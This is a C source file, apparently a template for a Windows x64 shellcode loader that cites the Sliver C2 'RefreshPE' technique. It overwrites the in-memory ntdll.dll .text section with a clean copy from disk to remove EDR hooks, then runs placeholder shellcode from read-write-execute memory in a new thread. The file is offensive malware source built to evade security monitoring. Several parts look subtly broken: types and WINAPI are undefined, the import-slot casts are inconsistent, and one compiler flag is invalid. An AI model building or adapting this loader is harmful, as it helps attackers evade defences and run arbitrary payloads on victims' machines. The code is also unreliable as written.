/*
 * RefreshPE Unhook Loader — x64 Windows
 *
 * Compiles with: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables
 *                -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh
 *                --gc-sections -s -nostdlib -o loader.exe unhook_loader.c -lkernel32
 *
 * Technique: Map a fresh copy of ntdll.dll from disk.
 *            Overwrite the loaded ntdll's .text section with clean bytes
 *            to remove EDR hooks. Then execute shellcode.
 *
 * Reference: Sliver C2 RefreshPE technique
 *
 * Placeholders replaced at build time:
 *   {{SHELLCODE_BYTES}}  — comma-separated hex bytes
 *   {{SHELLCODE_LEN}}    — number of bytes
 */

typedef unsigned char  BYTE;
typedef unsigned long  DWORD;
typedef void* HANDLE;
typedef int BOOL;

#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_READONLY           0x02
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define GENERIC_READ            0x80000000
#define OPEN_EXISTING           3
#define FILE_SHARE_READ         0x00000001

static BYTE shellcode[] = { {{SHELLCODE_BYTES}} };
static DWORD shellcode_len = {{SHELLCODE_LEN}};

/* ── Minimal PE structures ── */
typedef struct {
    WORD    e_magic;
    LONG    e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
    DWORD  Signature;
    struct {
        WORD  Machine;
        WORD  NumberOfSections;
        DWORD TimeDateStamp;
        DWORD PointerToSymbolTable;
        DWORD NumberOfSymbols;
        WORD  SizeOfOptionalHeader;
        WORD  Characteristics;
    } FileHeader;
    struct {
        WORD    Magic;
        BYTE    MajorLinkerVersion;
        BYTE    MinorLinkerVersion;
        DWORD   SizeOfCode;
        DWORD   SizeOfInitializedData;
        DWORD   AddressOfEntryPoint;
        DWORD   BaseOfCode;
        ULONG_PTR ImageBase;
        DWORD   SectionAlignment;
        DWORD   FileAlignment;
    } OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct {
    char    Name[8];
    DWORD   VirtualSize;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} IMAGE_SECTION_HEADER;

/* ── API prototypes ── */
typedef void*   (WINAPI *fnVirtualAlloc)(void*, DWORD, DWORD, DWORD);
typedef void    (WINAPI *fnRtlMoveMemory)(void*, const void*, DWORD);
typedef void*   (WINAPI *fnCreateThread)(void*, DWORD, void*, void*, DWORD, DWORD*);
typedef DWORD   (WINAPI *fnWaitForSingleObject)(void*, DWORD);
typedef void*   (WINAPI *fnGetModuleHandleA)(const char*);
typedef HANDLE  (WINAPI *fnCreateFileA)(const char*, DWORD, DWORD, void*, DWORD, DWORD, void*);
typedef BOOL    (WINAPI *fnReadFile)(HANDLE, void*, DWORD, DWORD*, void*);
typedef BOOL    (WINAPI *fnCloseHandle)(HANDLE);
typedef DWORD   (WINAPI *fnVirtualProtect)(void*, DWORD, DWORD, DWORD*);
typedef DWORD   (WINAPI *fnGetFileSize)(HANDLE, void*);
typedef void*   (WINAPI *fnSetFilePointer)(HANDLE, LONG, void*, DWORD);

/* ── Entry point ── */
void mainCRTStartup(void)
{
    extern void* __imp_VirtualAlloc;
    extern void  __imp_RtlMoveMemory;
    extern void* __imp_CreateThread;
    extern DWORD __imp_WaitForSingleObject;
    extern void* __imp_GetModuleHandleA;
    extern void* __imp_CreateFileA;
    extern DWORD __imp_ReadFile;
    extern DWORD __imp_CloseHandle;
    extern DWORD __imp_VirtualProtect;
    extern DWORD __imp_GetFileSize;
    extern void* __imp_SetFilePointer;

    fnVirtualAlloc      pVAlloc     = (fnVirtualAlloc)&__imp_VirtualAlloc;
    fnRtlMoveMemory     pMove       = (fnRtlMoveMemory)&__imp_RtlMoveMemory;
    fnGetModuleHandleA  pGetMod     = (fnGetModuleHandleA)&__imp_GetModuleHandleA;
    fnCreateFileA       pCreateFile = (fnCreateFileA)&__imp_CreateFileA;
    fnReadFile          pReadFile   = (fnReadFile)&__imp_ReadFile;
    fnCloseHandle       pClose      = (fnCloseHandle)&__imp_CloseHandle;
    fnVirtualProtect    pVProt      = (fnVirtualProtect)&__imp_VirtualProtect;
    fnGetFileSize       pGetSize    = (fnGetFileSize)&__imp_GetFileSize;
    fnSetFilePointer    pSetPtr     = (fnSetFilePointer)&__imp_SetFilePointer;

    /* ── Step 1: RefreshPE — reload ntdll .text from disk ── */
    HANDLE hFile = pCreateFile("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);

    if (hFile && hFile != (HANDLE)-1) {
        DWORD fileSize = pGetSize(hFile, 0);
        void* buf = pVAlloc(0, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);

        if (buf) {
            DWORD bytesRead = 0;
            pReadFile(hFile, buf, fileSize, &bytesRead, 0);

            /* Parse PE headers */
            IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buf;
            if (dos->e_magic == 0x5A4D) {
                IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)buf + dos->e_lfanew);
                if (nt->Signature == 0x00004550) {
                    /* Locate .text section */
                    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(
                        (BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

                    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                        /* Compare "text" */
                        if (sections[i].Name[0] == '.' &&
                            sections[i].Name[1] == 't' &&
                            sections[i].Name[2] == 'e' &&
                            sections[i].Name[3] == 'x' &&
                            sections[i].Name[4] == 't') {
                            /* Get loaded ntdll base */
                            void* loaded = pGetMod("ntdll.dll");
                            if (loaded) {
                                void* target = (BYTE*)loaded + sections[i].VirtualAddress;
                                DWORD oldProt;
                                pVProt(target, sections[i].VirtualSize,
                                       PAGE_EXECUTE_READWRITE, &oldProt);
                                pMove(target,
                                      (BYTE*)buf + sections[i].PointerToRawData,
                                      sections[i].SizeOfRawData);
                                pVProt(target, sections[i].VirtualSize, oldProt, &oldProt);
                            }
                            break;
                        }
                    }
                }
            }
        }
        pClose(hFile);
    }

    /* ── Step 2: Allocate executable memory ── */
    void* exec = pVAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE);

    /* ── Step 3: Copy shellcode ── */
    pMove(exec, shellcode, shellcode_len);

    /* ── Step 4: Execute ── */
    void* thread = ((fnCreateThread)&__imp_CreateThread)(
        0, 0, exec, 0, 0, 0);

    if (thread) {
        ((fnWaitForSingleObject)&__imp_WaitForSingleObject)(thread, 0xFFFFFFFF);
    }
}
